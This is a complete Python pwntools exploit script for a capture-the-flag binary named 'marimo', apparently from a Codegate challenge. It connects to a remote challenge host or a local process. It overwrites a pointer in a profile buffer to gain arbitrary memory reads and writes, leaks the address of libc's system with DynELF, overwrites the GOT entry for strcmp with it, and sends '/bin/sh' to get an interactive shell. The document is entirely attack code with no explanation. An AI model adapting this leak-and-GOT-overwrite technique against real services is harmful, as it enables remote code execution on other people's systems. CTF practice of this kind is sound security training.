from pwn import *

import sys

context(
    arch='amd64',
    terminal = ['urxvt', '--hold', '-e', 'bash', '-c']
)


if sys.argv[1] == 'remote':
    p = remote('ch41l3ng3s.codegate.kr', 3333, timeout=None)
    local = False
else:
    p = process('./marimo')
    local = True

offset = 56
addr_main = 0x4008F6
addr_got_strcmp = 0x603040

def create(name, profile):
    p.clean()
    p.sendline('show me the marimo')

    p.recvuntil('name? (0x10)')
    p.sendline(name)

    p.recvuntil('profile. (0x20)')
    p.sendline(profile)

def modify(index, profile):
    p.clean()

    p.sendline('V')
    bowls = p.recvuntil('Select number or [B]ack')
    assert ('[ bowl %d ]' % index) in bowls
    p.sendline(str(index))

    p.recvuntil('[M]odify / [B]ack ?')
    p.sendline('M')

    p.recvuntil('Give me new profile')
    p.sendline(profile)

    p.recvuntil('[M]odify / [B]ack ?')
    p.sendline('B')

create(cyclic(0x10), cyclic(0x20))
create(cyclic(0x10), cyclic(0x20))

sleep(1)

def leak(addr):

    modify(0, fit({
        offset: p64(addr)
    }))

    p.clean()

    p.sendline('V')
    p.sendline('1')
    p.recvuntil('name : ')

    val = p.recvuntil('\nprofile : ', drop=True) + '\x00'

    print hex(addr), ':', val.encode('hex')

    p.recvuntil('[B]ack')
    p.sendline('B')

    return val

def write(where, what):

    print 'write', what.encode('hex'), '->', hex(where)

    p.clean()

    modify(0, fit({
        offset     : p64(where),
        offset + 8 : p64(where)
    }))

    p.clean()

    modify(1, what)

elf = ELF('./marimo')
dyn = DynELF(leak, pointer=addr_main, libcdb=False, elf=elf)

addr_system = dyn.lookup('system', 'libc')

assert '\n' not in p64(addr_system)

print 'system:', hex(addr_system)

write(addr_got_strcmp, p64(addr_system)[:-2])

p.sendline('/bin/sh')
p.interactive()
